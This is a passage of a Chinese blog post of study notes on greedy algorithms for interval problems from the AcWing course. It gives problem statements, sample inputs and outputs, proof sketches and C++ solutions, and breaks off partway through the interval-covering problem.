        <content type="html"><![CDATA[<p>贪心题型困难之处在于<strong>既无固定模板</strong>，<strong>也无固定套路</strong>。<br>往往需要先猜（做题经验很重要），然后证明方法的正确性（平时靠数学证明，笔试靠提交AC哈哈哈）</p><span id="more"></span><table><thead><tr><th><img src="/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-6-%E8%B4%AA%E5%BF%83/QQ_Image_1669642232353.jpg" alt></th><th><img src="/2022/11/28/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-6-%E8%B4%AA%E5%BF%83/QQ_Image_1669642233841.jpg" alt></th></tr></thead></table><!--more--><h1 id="区间问题">区间问题</h1><h2 id="AcWing-905-区间选点">AcWing 905. 区间选点</h2><p><code>难度：简单</code></p><h3 id="题目描述">题目描述</h3><p>给定N个闭区间[ai,bi]，请你在数轴上选择尽量少的点，使得每个区间内至少包含一个选出的点。</p><p>输出选择的点的最小数量。</p><p>位于区间端点上的点也算作区间内。</p><p><strong>输入格式</strong></p><p>第一行包含整数N，表示区间数。</p><p>接下来N行，每行包含两个整数ai,bi，表示一个区间的两个端点。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示所需的点的最小数量。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1≤N≤10^5,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><mi>a</mi><mi>i</mi><mo>≤</mo><mi>b</mi><mi>i</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">−10^9≤ai≤bi≤10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">ai</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">bi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入样例：</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="operator">-</span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">3</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">输出样例：</span><br><span class="line"></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="贪心">贪心</h3><p><strong>做法</strong></p><ol><li>将每个区间按<code>右端点</code>从小到大排序</li><li>从前往后枚举每个区间<br>若已包含点，则pass<br>否则(<code>区间左端点 &gt; 该点</code>)，选择当前区间的右断端点</li></ol><p><strong>证明</strong>：求得点数为<code>cnt</code>，答案数为<code>ans</code>，即证cnt = ans</p><ol><li><p>ans &lt;= cnt: 方案可行，且ans可行方案中最小点数的方案</p></li><li><p>ans &gt;= cnt:</p><blockquote><p>点分布在cnt个互不连接的区间上，要覆盖这cnt个区间，需要的点数ans &gt;= 区间数cnt</p></blockquote></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Range</span> &#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="comment">// 务必掌握 结构体重载运算符 的写法</span></span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Range &amp;W) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r &lt; W.r;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;ranges[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;ranges[i].l, &amp;ranges[i].r);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(ranges, ranges + n);  <span class="comment">// 别忘sort()</span></span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ed &lt; ranges[i].l) &#123;</span><br><span class="line">      res++;</span><br><span class="line">      ed = ranges[i].r;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-908-最大不相交区间数量">AcWing 908. 最大不相交区间数量</h2><p><code>难度：简单</code></p><h3 id="题目描述-2">题目描述</h3><p>给定N个闭区间[ai,bi]，请你在数轴上选择若干区间，使得选中的区间之间互不相交（包括端点）。</p><p>输出可选取区间的最大数量。</p><p><strong>输入格式</strong></p><p>第一行包含整数N，表示区间数。</p><p>接下来N行，每行包含两个整数ai,bi，表示一个区间的两个端点。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示可选取区间的最大数量。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1≤N≤10^5,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><mi>a</mi><mi>i</mi><mo>≤</mo><mi>b</mi><mi>i</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">−10^9≤ai≤bi≤10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">ai</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">bi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入样例：</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="operator">-</span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">3</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line">输出样例：</span><br><span class="line"></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="贪心-2">贪心</h3><p>做法与上一题一致。</p><p>证明：</p><ol><li><p>ans &gt;= cnt 做法可行，且ans为max的可行</p></li><li><p>ans &lt;= cnt</p><blockquote><p>z若存在这ans个两两不相交的区间，那么要使得每个区间上至少一个点，至少需要cnt个点，那么cnt &gt;= ans</p></blockquote></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Range</span> &#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Range &amp;W) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r &lt; W.r;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;ranges[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;ranges[i].l, &amp;ranges[i].r);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">sort</span>(ranges, ranges + n);</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ed &lt; ranges[i].l) &#123;</span><br><span class="line">      res++;</span><br><span class="line">      ed = ranges[i].r;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-906-区间分组">AcWing 906. 区间分组</h2><p>给定 N 个闭区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>b</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a_i, b_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>，请你将这些区间分成若干组，使得每组内部的区间两两之间（包括端点）没有交集，并使得组数尽可能小。</p><p>输出最小组数。</p><p><strong>输入格式</strong><br>第一行包含整数 N，表示区间数。</p><p>接下来 N 行，每行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><mtext> </mtext><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i,\ b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，表示一个区间的两个端点。</p><p><strong>输出格式</strong><br>输出一个整数，表示最小组数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1\le N \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><msub><mi>a</mi><mi>i</mi></msub><mo>≤</mo><msub><mi>b</mi><mi>i</mi></msub><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le a_i \le b_i \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">-1 1</span><br><span class="line">2 4</span><br><span class="line">3 5</span><br></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="贪心-3">贪心</h3><p><strong>做法</strong></p><ol><li><p>区间按左端点排序</p></li><li><p>从前往后处理每个区间</p><p>判断是否能将其放到某个现有的组中 <code>l[i] &gt; Max_r</code></p><ol><li><p>若不存在这样的组，则开新组，然后将其放入</p></li><li><p>若存在，则将其放入，并更新当前组的<code>Max_r</code></p><blockquote><p>若存在多个，则随便挑一个放入就行</p></blockquote></li></ol></li></ol><p><strong>证明</strong></p><ol><li><p>ans &lt;= cnt 合法且…</p></li><li><p>ans &gt;= cnt</p><blockquote><p>在即将产生第cnt个分组的时刻，这时l[i]大于所有组的Max_r</p><p>即存在cnt个相互有重叠的区间，所以ans &gt;= cnt</p></blockquote></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Range</span> &#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Range &amp;W) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> l &lt; W.l;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;ranges[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;ranges[i].l, &amp;ranges[i].r);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(ranges, ranges + n);</span><br><span class="line">  priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; heap;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (heap.<span class="built_in">empty</span>() || heap.<span class="built_in">top</span>() &gt;= ranges[i].l) &#123;</span><br><span class="line">      heap.<span class="built_in">push</span>(ranges[i].r);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      heap.<span class="built_in">pop</span>();</span><br><span class="line">      heap.<span class="built_in">push</span>(ranges[i].r);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, heap.<span class="built_in">size</span>());<span class="comment">// heap.size()为结果</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-907-区间覆盖">AcWing 907. 区间覆盖</h2><p>给定 N 个闭区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>b</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a_i,b_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" 